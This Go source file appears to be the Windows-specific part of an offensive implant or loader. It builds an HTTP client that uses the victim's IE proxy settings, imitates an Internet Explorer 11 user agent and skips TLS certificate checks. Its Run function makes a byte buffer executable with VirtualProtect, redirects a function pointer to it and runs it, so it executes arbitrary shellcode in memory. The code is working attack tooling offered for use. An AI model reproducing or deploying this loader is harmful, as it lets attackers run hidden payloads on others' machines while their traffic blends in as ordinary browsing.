// +build windows

//Windows specific code is in this file
package main

import (
	"crypto/tls"
	"errors"
	"net"
	"net/http"
	"net/url"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

type userAgentTransport struct{
	userAgent string
	rt http.RoundTripper
}

func(t *userAgentTransport) RoundTrip(r *http.Request)(*http.Response, error){
	r.Header.Set("User-Agent", t.userAgent)
	return t.rt.RoundTrip(r)
}


type WINHTTP_CURRENT_USER_IE_PROXY_CONFIG struct {
	fAutoDetect       bool
	lpszAutoConfigUrl *uint16
	lpszProxy         *uint16
	lpszProxyBypass   *uint16
}

func GoWString(s *uint16) string {
	if s == nil {
		return ""
	}
	p := (*[1<<30 - 1]uint16)(unsafe.Pointer(s))
	sz := 0
	for p[sz] != 0 {
		sz++
	}
	return string(utf16.Decode(p[:sz:sz]))
}


func getProxy()(url.URL, error){
	winHttpApi := syscall.NewLazyDLL("Winhttp.dll")
	WinHttpGetDefaultProxyConfiguration := winHttpApi.NewProc("WinHttpGetIEProxyConfigForCurrentUser")
	out := WINHTTP_CURRENT_USER_IE_PROXY_CONFIG{}
	WinHttpGetDefaultProxyConfiguration.Call(uintptr(unsafe.Pointer(&out)))
	proxyServer := GoWString(out.lpszProxy)
	if proxyServer != "" {
		proxyServer := GoWString(out.lpszProxy)
		parsedUrl, err := url.Parse("http://"+proxyServer)
		if err == nil{
			return *parsedUrl, nil
		}
	}
	return url.URL{}, errors.New("No Proxy Found")
}

func newClient()*http.Client{
	proxy, err := getProxy()
	if err == nil{
		client := &http.Client{
			Transport: &userAgentTransport{
				userAgent: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
				rt: &http.Transport{
					DisableKeepAlives: true,
					Proxy: http.ProxyURL(&proxy),
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
					DialContext:(&net.Dialer{
						Timeout:   3 * time.Second,
					}).DialContext,
					TLSHandshakeTimeout:   10 * time.Second,
				},
			},
		}
		return client
	}else{
		client := &http.Client{
			Transport: &userAgentTransport{
				userAgent: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
				rt: &http.Transport{
					DisableKeepAlives: true,
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
					DialContext:(&net.Dialer{
						Timeout:   3 * time.Second,
					}).DialContext,
					TLSHandshakeTimeout:   10 * time.Second,
				},

			},

		}
		return client
	}

}


func Run(executable []byte) {
	//Found example of executing shellcode in memory here: https://github.com/brimstone/go-shellcode
	f := func() {}
	var oldfperms uint32
	virtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms))
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&executable))
	var oldshellcodeperms uint32
	virtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&executable))), uintptr(len(executable)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms))
	f()
}

func virtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer){
	ret, _, _ := procVirtualProtect.Call(uintptr(lpAddress), uintptr(dwSize), uintptr(flNewProtect), uintptr(lpflOldProtect))
	if ret <= 0{
		panic("Call to VirtualProtect failed!")
	}
}
